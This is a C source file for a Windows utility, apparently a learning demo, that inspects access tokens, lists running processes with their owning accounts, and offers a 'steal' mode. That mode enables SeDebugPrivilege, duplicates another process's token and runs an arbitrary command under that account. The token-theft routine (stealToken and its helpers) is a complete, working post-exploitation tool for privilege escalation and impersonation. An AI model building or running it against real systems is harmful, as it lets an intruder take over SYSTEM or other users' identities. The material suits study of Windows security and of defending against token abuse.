#include <stdio.h>
#include <Windows.h>
#include <sddl.h>
#include <winternl.h>

#pragma comment(lib, "Ntdll");
#pragma comment(lib, "userenv");

#define STATUS_INFO_LENGTH_MISMATCH             ((NTSTATUS)0xC0000004L)
#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L)

void printToken(BOOL isFull);

BOOL GetDebugPrivilege()
{
	BOOL status = FALSE;
	HANDLE hToken;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tokenPrivs;
		tokenPrivs.PrivilegeCount = 1;
		if (LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &tokenPrivs.Privileges[0].Luid))
		{
			tokenPrivs.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;
			if (AdjustTokenPrivileges(hToken, FALSE, &tokenPrivs, sizeof(tokenPrivs), NULL, NULL))
			{
				status = TRUE;
			}
		}
		else wprintf(L"[!] LookupPrivilegeValueW error: %u when get debug privilege.\n", GetLastError());

		CloseHandle(hToken);
	}
	else wprintf(L"[!] OpenProcessToken error: %u when get debug privilege.\n", GetLastError());

	return status;
}


void doEcho(HANDLE hDupToken, wchar_t* cmd)
{
	SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	HANDLE hStdoutR = NULL, hStdoutW = NULL;
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	BYTE resultBuf[4096];
	DWORD dwRead, i;


	if (CreatePipe(&hStdoutR, &hStdoutW, &saAttr, 0))
	{
		SetHandleInformation(hStdoutR, HANDLE_FLAG_INHERIT, 0);
		si.cb = sizeof(STARTUPINFO);
		si.hStdOutput = hStdoutW;
		si.hStdError = si.hStdOutput;
		si.dwFlags |= STARTF_USESTDHANDLES;

		if (CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, NULL, cmd, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi))
		{
			CloseHandle(si.hStdOutput);
			si.hStdOutput = si.hStdError = NULL;
			while (ReadFile(hStdoutR, resultBuf, sizeof(resultBuf), &dwRead, NULL) && dwRead)
			{
				for (i = 0; i < dwRead; i++)
					wprintf(L"%c", resultBuf[i]);
			}

			WaitForSingleObject(pi.hProcess, INFINITE);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
		}
		else wprintf(L"CreateProcessWithTokenW error 0x%08X\n", GetLastError());

	}
	else wprintf(L"CreatePipe error! 0x%08X\n", GetLastError());

	CloseHandle(hStdoutR);
	CloseHandle(hStdoutW);
}

void doInteractive(HANDLE hDupHandle, wchar_t* cmd)
{
	wprintf(L"[!] TODO\n");
}

BOOL stealToken(DWORD pid, wchar_t* cmd, BOOL isInteractive, BOOL isEcho)
{
	HANDLE hProcess, hToken, hDupToken;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION procInfo;


	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	if (GetDebugPrivilege())
	{
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
		if (hProcess)
		{
			wprintf(L"[*] Open process. PID: %d\n", pid);
			if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken))
			{
				wprintf(L"[*] OpenProcessToken success.\n");

				if (DuplicateTokenEx(hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken))
				{
					wprintf(L"[*] DuplicateTokenEx.\n");

					if (isEcho)
					{
						wprintf(L"[*] Excute command and get result.\n\n");
						doEcho(hDupToken, cmd);

					}
					else if (isInteractive)
					{
						wprintf(L"[*] Excute command interacitve.\n\n");
						doInteractive(hDupToken, cmd);
					}
					else
					{
						wprintf(L"[*] Execute command without result output.\n");
						if (CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, NULL, cmd, CREATE_NEW_CONSOLE, NULL, NULL, &startupInfo, &procInfo))
							wprintf(L"[*] CreateProcessWithTokenW success.\n");
						else wprintf(L"[!] CreateProcessWithTokenW error: %u\n", GetLastError());
					}


				}
				else wprintf(L"[!] DuplicateTokenEx error: %u\n", GetLastError());


			}
			else wprintf(L"[!] OpenProcessToken error: %u\n", GetLastError());
		}
	}
}

BOOL getNameDomainFromSID(PSID pSid, PWSTR* domainName, PWSTR* userName)
{
	BOOL result = FALSE;
	SID_NAME_USE sidNameUse;
	DWORD cchName = 0, cchReferencedDomainName = 0;

	if (!LookupAccountSid(NULL, pSid, NULL, &cchName, NULL, &cchReferencedDomainName, &sidNameUse) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
	{
		if (*userName = (PWSTR)LocalAlloc(LPTR, cchName * sizeof(wchar_t)))
		{
			if (*domainName = (PWSTR)LocalAlloc(LPTR, cchReferencedDomainName * sizeof(wchar_t)))
			{
				result = LookupAccountSid(NULL, pSid, *userName, &cchName, *domainName, &cchReferencedDomainName, &sidNameUse);
				if (!result)
					*domainName = (PWSTR)LocalFree(*domainName);
			}
			if (!result)
				*userName = (PWSTR)LocalFree(*userName);
		}
	}
	return result;
}

void parseToken(HANDLE hToken, BOOL isFull)
{
	PWSTR domainName, userName, sid, privName;
	TOKEN_STATISTICS tokenStatis;
	TOKEN_ELEVATION_TYPE elevationType;
	DWORD dwSize, sessionId;
	PTOKEN_USER pTokenUser;
	PTOKEN_GROUPS_AND_PRIVILEGES pGAP;
	DWORD i;
	
	if (!GetTokenInformation(hToken, TokenStatistics, &tokenStatis, sizeof(TOKEN_STATISTICS), &dwSize))
	{
		wprintf(L"[!] GetTokenInformation error: %u\n", GetLastError());
		
	}
	wprintf(L"> Token Information.\n");
	wprintf(L"\t%-21s: {%d;%d}\n", L"Authentication ID", tokenStatis.AuthenticationId.HighPart, tokenStatis.AuthenticationId.LowPart);
	wprintf(L"\t%-21s: %s\n", L"Token type", tokenStatis.TokenType ? L"Primary" : L"Impersonation");
	wprintf(L"\t%-21s: %d\n", L"Impersonation Level", tokenStatis.ImpersonationLevel);
	wprintf(L"\t%-21s: %d\n", L"Group Count", tokenStatis.GroupCount);
	wprintf(L"\t%-21s: %d\n", L"Privilege Count", tokenStatis.PrivilegeCount);
	

	if (!GetTokenInformation(hToken, TokenSessionId, &sessionId, sizeof(TokenSessionId), &dwSize))
	{
		wprintf(L"[!] GetTokenInformation error: %u\n", GetLastError());
	}

	wprintf(L"\t%-21s: %u\n", L"Session ID", sessionId);

	if (!GetTokenInformation(hToken, TokenElevationType, &elevationType, sizeof(TOKEN_ELEVATION_TYPE), &dwSize))
	{
		wprintf(L"[!] GetTokenInformation error: %u\n", GetLastError());
	}
	wprintf(L"\t%-21s: %s\n", L"Elevation Type",
		(elevationType == TokenElevationTypeDefault) ? L"Default" : ((elevationType == TokenElevationTypeFull) ? L"Full" : L"Limited")
	);

	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
	{
		if (pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, dwSize))
		{
			if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
			{
				if (getNameDomainFromSID(pTokenUser->User.Sid, &domainName, &userName))
				{
					wprintf(L"\t%-21s: %s\\%s\n", L"User", domainName, userName);
				}
				
				if (ConvertSidToStringSid(pTokenUser->User.Sid, &sid))
				{
					wprintf(L"\t%-21s: %s\n\n", L"SID", sid);
				}
				
			}
			LocalFree(pTokenUser);
		}
	}


	if (isFull)
	{
		if (!GetTokenInformation(hToken, TokenGroupsAndPrivileges, NULL, 0, &dwSize) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
		{
			if (pGAP = (PTOKEN_GROUPS_AND_PRIVILEGES)LocalAlloc(LPTR, dwSize))
			{
				if (GetTokenInformation(hToken, TokenGroupsAndPrivileges, pGAP, dwSize, &dwSize))
				{
					wprintf(L"> Group List.\n");

					for (i = 0; i < (pGAP->SidCount - 1); i++)
					{
						if (getNameDomainFromSID((pGAP->Sids + 1)[i].Sid, &domainName, &userName))
						{
							if (ConvertSidToStringSid((pGAP->Sids + 1)[i].Sid, &sid))
							{
								if (lstrlen(domainName))
									wprintf(L"\t%s\\%s\t%s\n", domainName, userName, sid);
								LocalFree(domainName);
								LocalFree(userName);
							}

						}
					}


					wprintf(L"\n> Privilege List.\n");

					for (i = 0; i < pGAP->PrivilegeCount; i++)
					{
						dwSize = 0;
						if (!LookupPrivilegeName(NULL, &pGAP->Privileges[i].Luid, NULL, &dwSize) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
						{
							if (privName = (PWSTR)LocalAlloc(LPTR, (dwSize + 1) * sizeof(wchar_t)))
							{
								if (LookupPrivilegeName(NULL, &pGAP->Privileges[i].Luid, privName, &dwSize))
								{
									wprintf(L"\t%-35s\t%s\n", privName,
										(pGAP->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) ? L"Enabled" : L"Disabled"
									);
								}
								LocalFree(privName);
							}
						}
						else if (GetLastError() == ERROR_NO_SUCH_PRIVILEGE)
							wprintf(L"{%x; %08x}\n", pGAP->Privileges[i].Luid.HighPart, pGAP->Privileges[i].Luid.LowPart);
						else wprintf(L"[!]LookupPrivilegeName error!\n");
					}

					wprintf(L"\n");
				}
			}
		}
	}

}

void printToken(BOOL isFull)
{
	HANDLE hToken;
	wprintf(L"[*] Process Token.\n");
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
		wprintf(L"[!] OpenProcessToken error: %u\n", GetLastError());
	else parseToken(hToken, isFull);

	wprintf(L"[*] Thread Token.\n");
	if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken))
		parseToken(hToken, isFull);
	else if (GetLastError() == ERROR_NO_TOKEN)
		wprintf(L"\tNo token.\n");
	else wprintf(L"[!] OpenProcessToken error: %u\n", GetLastError());
}


void getTokenList()
{
	DWORD dwSize, i;
	PSYSTEM_PROCESS_INFORMATION pProcessInfo = NULL;
	NTSTATUS ntReturn;
	HANDLE hProcess;
	PTOKEN_USER pTokenUser;
	PWSTR domainName, userName, sid;
	DWORD flag = TRUE;
	HANDLE hToken;


	dwSize = 256 * 1000;

	pProcessInfo = (PSYSTEM_PROCESS_INFORMATION)malloc(dwSize);
	ntReturn = NtQuerySystemInformation(SystemProcessInformation, pProcessInfo, dwSize, &dwSize);

	while (ntReturn == STATUS_INFO_LENGTH_MISMATCH) {
		free(pProcessInfo);
		pProcessInfo = (PSYSTEM_PROCESS_INFORMATION)malloc(dwSize);
		ntReturn = NtQuerySystemInformation(SystemProcessInformation, pProcessInfo, dwSize, &dwSize);
	}

	wprintf(L"[*] Print process list with token.\n\n");
	wprintf(L"%-15s%-50s%s\n", L"PID", L"PROCNAME", L"TOKEN");
	wprintf(L"%-15s%-50s%s\n", L"-----", L"-----", L"-----");

	

	if (ntReturn == STATUS_SUCCESS && GetDebugPrivilege())
	{
		while (flag)
		{
			if (pProcessInfo->NextEntryOffset == 0)
				flag = FALSE;

			wprintf(L"%-15d", (DWORD)pProcessInfo->UniqueProcessId);
			wprintf(L"%-50s", (wchar_t*)pProcessInfo->ImageName.Buffer);
			hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)pProcessInfo->UniqueProcessId);


			if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
			{
				pProcessInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pProcessInfo + pProcessInfo->NextEntryOffset);
				wprintf(L"\n");
				// wprintf(L"\n[!] OpenProcessToken error: %u", GetLastError());
				continue;
			}

			if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
			{
				if (pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, dwSize))
				{
					if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
					{
						if (getNameDomainFromSID(pTokenUser->User.Sid, &domainName, &userName))
						{
							wprintf(L"%s\\%s\n", domainName, userName);
						}
						
						/*if (ConvertSidToStringSid(pTokenUser->User.Sid, &sid))
						{
							wprintf(L"\t%s\n", sid);
						}*/

					}
					LocalFree(pTokenUser);
				}
			}

			pProcessInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pProcessInfo + pProcessInfo->NextEntryOffset);

		}
	}

}

void printUsage()
{
	wprintf(L"Intro: A demo written for learning windows access token.\n");
	wprintf(L"Author: @Loong716\n");
	wprintf(L"Usage:\n");
	wprintf(L"\tTokenTest.exe whoami [/full]\n");
	wprintf(L"\tTokenTest.exe list\n");
	wprintf(L"\tTokenTest.exe steal <pid> <command> [/interactive | /echo]\n");
}

int wmain(int argc, wchar_t* argv[])
{
	
	BOOL isFull = FALSE;
	BOOL isInteractive = FALSE;
	BOOL isEcho = FALSE;
	
	if (argv[1] && (wcscmp(argv[1], L"whoami") == 0))
	{
		if (argv[2] && (wcscmp(argv[2], L"/full") == 0))
			isFull = TRUE;

		printToken(isFull);
	}
	else if (argv[1] && (wcscmp(argv[1], L"list") == 0))
	{
		getTokenList();
	}
	else if (argv[1] && (wcscmp(argv[1], L"steal") == 0))
	{
		if (argv[2] && argv[3])
		{
			if (argv[4] && (wcscmp(argv[4], L"/interactive") == 0))
			{
				isInteractive = TRUE;
			}

			if (argv[4] && (wcscmp(argv[4], L"/echo") == 0))
			{
				isEcho = TRUE;
			}

			stealToken(_wtoi(argv[2]), argv[3], isInteractive, isEcho);
		}
		else wprintf(L"[!] Please enter the target pid and command to execute.\n");
	}
	else
	{
		printUsage();
	}

	return 0;
}


